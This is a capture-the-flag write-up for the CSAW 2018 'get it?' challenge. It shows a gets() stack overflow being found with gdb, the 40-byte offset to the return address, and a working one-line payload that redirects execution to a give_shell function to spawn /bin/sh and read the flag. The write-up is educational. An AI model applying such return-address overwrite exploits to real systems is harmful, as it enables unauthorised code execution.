# get it? CSAW 2018 Qualification Round

Let's start by looking at the file we are given.

```
$ file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
```

It is an x86_64 executable.  Now let's run it and see what happens.

```
$ ./get_it
Do you gets it??
maybe
```

The program prints a line and then waits for user input, which inputted main.  Now what happens if a lot of A's are provided as the input?

```
$ python2 -c "print 'A'*50" | ./get_it
Do you gets it??
[1]    3630 done                              python2 -c "print 'A'*500" | 
       3631 segmentation fault (core dumped)  ./get_it
```

Okay, there appears to be a segfault.  Let's run it in gdb and generate a pattern to be used as the input.

```
$ gdb get_it
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/steven/ctf/csaw/pwn/get_it/get_it 
Do you gets it??
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005f7 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x7ffff7f7d860      →  0x00000000fbad2288
$rdx   : 0x7ffff7f7f730      →  0x0000000000000000
$rsp   : 0x7fffffffdc28      →  "faaaaaaaga"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x602671            →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga"
$rdi   : 0x7fffffffdc01      →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga"
$rip   : 0x4005f7            →  <main+48> ret 
$r8    : 0x6026a3            →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x7ffff7f84500      →  0x00007ffff7f84500  →  [loop detected]
$r11   : 0x246             
$r12   : 0x4004c0            →  <_start+0> xor ebp, ebp
$r13   : 0x7fffffffdd00      →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$gs: 0x0000  $ss: 0x002b  $cs: 0x0033  $es: 0x0000  $ds: 0x0000  $fs: 0x0000  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdc28│+0x00: "faaaaaaaga"	 ← $rsp
0x00007fffffffdc30│+0x08: 0x0000000000006167 ("ga"?)
0x00007fffffffdc38│+0x10: 0x00007fffffffdd08  →  0x00007fffffffe01d  →  "/home/steven/ctf/csaw/pwn/get_it/get_it"
0x00007fffffffdc40│+0x18: 0x0000000100040000
0x00007fffffffdc48│+0x20: 0x00000000004005c7  →  <main+0> push rbp
0x00007fffffffdc50│+0x28: 0x0000000000000000
0x00007fffffffdc58│+0x30: 0xe2edf0fa2a79dedd
0x00007fffffffdc60│+0x38: 0x00000000004004c0  →  <_start+0> xor ebp, ebp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
     0x4005f1 <main+42>        mov    eax, 0x0
     0x4005f6 <main+47>        leave  
 →   0x4005f7 <main+48>        ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "get_it", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4005f7 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $rsp
[+] Searching '$rsp'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
gef➤  
```

As can be seen above, the return address that is being overwritten is 40 characters into the user input.  So now we can overwrite the return address, but where should we jump to?

```
gef➤  checksec
[+] checksec for '/home/steven/ctf/csaw/pwn/get_it/get_it'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

As can be seen above, NX is enabled.  This means we can't just jump to shellcode.  Therefore, we need to use ROP.  Except, doing a quick objdump on the file reveals something interesting.

```
$ objdump -M intel -d get_it
...
00000000004005b6 <give_shell>:
  4005b6:	55                   	push   rbp
  4005b7:	48 89 e5             	mov    rbp,rsp
  4005ba:	bf 84 06 40 00       	mov    edi,0x400684
  4005bf:	e8 bc fe ff ff       	call   400480 <system@plt>
  4005c4:	90                   	nop
  4005c5:	5d                   	pop    rbp
  4005c6:	c3                   	ret    
...
```

Okay so we can just overwrite the return address to give_shell, since this function appears to launch /bin/sh.  Let's try that.

```
$ (python2 -c "print 'A'*40+'\xb6\x05\x40\x00\x00\x00\x00\x00'"; cat) | ./get_it
Do you gets it??
cat flag.txt
flag here
whoami
steven
```

As can be seen above, we have successfully overwritten the return address to give_shell which launched /bin/sh!

The flag for this challenge was:

```
flag{y0u_deF_get_itls}
```
